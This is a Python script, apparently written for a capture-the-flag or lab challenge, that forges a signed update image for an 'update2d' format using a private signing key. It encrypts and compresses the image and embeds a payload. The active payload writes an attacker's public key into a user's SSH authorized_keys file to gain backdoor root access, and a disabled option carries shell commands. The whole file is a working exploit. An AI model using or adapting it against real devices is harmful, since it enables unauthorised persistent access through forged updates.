import struct, hmac, hashlib, zlib, lz4.frame, binascii

#constants from update2d.h
MAGIC   = b'\x55\x50'
VERSION = 2
key     = open("images/key.priv", "rb").read()

#feature toggles
ENCRYPT       = True
COMPRESS_ZLIB = True
COMPRESS_LZ4  = True
UU_ENCODE     = True
#payload toggles
EXEC_PAYLOAD = False
FILE_PAYLOAD = True

# rc4 - matches arc4.c
def rc4(key, data):
    #P1 KSA
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    #P2 PRGA
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def uu_encode(data):
    lines = ["begin 644 image.u2d"]
    i = 0
    while i < len(data):
        chunk = data[i:i+45]
        i += 45
        line = binascii.b2a_uu(chunk).decode('ascii').rstrip('\n')
        lines.append(line)
    lines.append('`')
    lines.append('end')
    return '\n'.join(lines).encode('ascii') + b'\n'

#build command
if EXEC_PAYLOAD:
    cmd = b"id; whoami; hostname\x00"
    obj = struct.pack("<BL", 0, len(cmd)) + cmd

#Bonus objective - root access using FILE object
if FILE_PAYLOAD:
    pub_key = open("/tmp/backdoor.pub", "rb").read()
    dst     = b"/home/user/.ssh/authorized_keys\x00"
    mode    = struct.pack("<I", 0o644)
    payload = dst + mode + pub_key
    obj     = struct.pack("<BL", 0x01, len(payload)) + payload

#compute HMAC over plaintext objects
tag = hmac.new(key, obj, hashlib.sha256).digest()

#assemble plaintext block: tag + objects
block = tag + obj

#apply transforms in encoding order: arc4 -> zlib -> uuencode
FLAGS = 0x02  # FLG_HMAC_SHA256 always set
if COMPRESS_LZ4:  FLAGS |= 0x01
if ENCRYPT:       FLAGS |= 0x04
if COMPRESS_ZLIB: FLAGS |= 0x08
if UU_ENCODE:     FLAGS |= 0x10

if COMPRESS_LZ4:
    block = lz4.frame.compress(block)

if ENCRYPT:
    block = rc4(key, block)

if COMPRESS_ZLIB:
    block = zlib.compress(block)

#build header and final image
hdr   = MAGIC + struct.pack("<BBL", VERSION, FLAGS, len(obj))
image = hdr + block

if UU_ENCODE:
    FLAGS |= 0x10
    encoded = uu_encode(image[2:])
    image = b'\x55\x55' + encoded

open("Testevil.u2d", "wb").write(image)
print(f"wrote {len(image)} bytes | flags={hex(FLAGS)}")
